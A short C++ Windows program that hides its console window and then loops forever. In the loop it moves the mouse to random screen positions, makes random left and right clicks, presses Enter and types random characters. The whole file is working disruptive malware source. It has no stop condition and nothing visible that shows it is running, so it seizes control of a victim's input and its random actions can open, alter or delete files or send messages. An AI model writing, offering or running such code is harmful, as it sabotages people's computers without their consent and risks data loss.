#include<windows.h>
#include<cstdlib>
#include<ctime>
int main(){
	srand(time(NULL));
	POINT p;
	int x=GetSystemMetrics(SM_CXSCREEN),y=GetSystemMetrics(SM_CYSCREEN);
	HWND hwnd=FindWindow("ConsoleWindowClass",NULL);
	ShowOwnedPopups(hwnd,SW_HIDE);
	ShowWindow(hwnd,SW_HIDE);
	while(1){
		SetCursorPos(rand()%x,rand()%y);
		if(rand()%3){
			if(rand()%2){
				mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0);
				Sleep(10);
				mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0);
			}else{
				mouse_event(MOUSEEVENTF_RIGHTDOWN,0,0,0,0);
				Sleep(10);
				mouse_event(MOUSEEVENTF_RIGHTUP,0,0,0,0);
			}
		}else if(rand()%2){
			keybd_event(VK_RETURN,0,0,0);
			Sleep(10);
			keybd_event(VK_RETURN,0,KEYEVENTF_KEYUP,0);
		}else{
			char k=rand()%96+32;
			keybd_event(k,0,0,0);
			Sleep(10);
			keybd_event(k,0,KEYEVENTF_KEYUP,0);
		}
	}
	return 0;
}
